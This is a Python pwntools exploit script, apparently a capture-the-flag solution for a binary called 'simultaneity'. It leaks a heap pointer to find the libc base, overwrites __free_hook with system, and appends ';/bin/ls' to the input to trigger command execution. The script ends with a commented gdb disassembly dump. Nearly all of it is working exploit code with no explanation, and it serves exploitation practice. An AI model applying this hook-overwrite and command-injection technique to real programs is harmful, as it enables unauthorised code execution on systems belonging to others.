from pwn import *

libc = ELF("./libc.so.6")
elf = ELF("./simultaneity")
ld = ELF("./ld-linux-x86-64.so.2")

target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
#target = remote("mc.ax", 31547)

target.sendline("3456789")

#'''
target.recvuntil(": ")
chunk_ptr = int(target.recvline().strip(), 0x10)
libc.address = chunk_ptr - 0x00007fef6c1b7010 + 0x00007fef6c503000
log.info("Chunk Ptr: " + hex(chunk_ptr))
log.info("LIBC Base: " + hex(libc.address))
log.info("__malloc_hook: " + hex(libc.sym['__malloc_hook']))
#'''
#202010100172

#________________________________________________________________________________________________________________________________________________________
address_to_be_overwritten = libc.sym['__free_hook']

target.sendline(str((address_to_be_overwritten - chunk_ptr)/8))

gdb.attach(target)

#________________________________________________________________________________________________________________________________________________________
value_to_be_written = libc.sym['system']
target.sendline(str(value_to_be_written) + "   ;/bin/ls")

target.interactive()

'''
LIBC Base: 0x7f3fef56a000

   0x00007f3fef5cf253 <+27219>: call   0x7f3fef58c230 <*ABS*+0x87be0@plt>       # 0x7f3fef725128 <*ABS*@got.plt>
   0x00007f3fef5cd371 <+19313>:  call   0x7f3fef58c260 <*ABS*+0x890e0@plt>
   0x00007f3fef5cd383 <+19331>: call   0x7f3fef58c260 <*ABS*+0x890e0@plt>       # 0x7f3fef725140 <*ABS*@got.plt>
   0x00007f3fef5cd336 <+19254>: call   0x7f3fef58c130 <*ABS*+0x88070@plt>
   0x00007f3fef5cbd03 <+13571>: call   0x7f3fef58c050 <realloc@plt>
   0x00007f3fef5cb5c7 <+11719>: call   0x7f3fef58c130 <*ABS*+0x88070@plt>       # 0x7f3fef7250a8 <*ABS*@got.plt>
   0x00007f3fef5cb48f <+11407>: call   0x7f3fef58c130 <*ABS*+0x88070@plt>
   0x00007f3fef5cb3af <+11183>: call   0x7f3fef58c130 <*ABS*+0x88070@plt>
   0x00007f3fef5cb178 <+10616>:  call   0x7f3fef58c308 <malloc@plt>
'''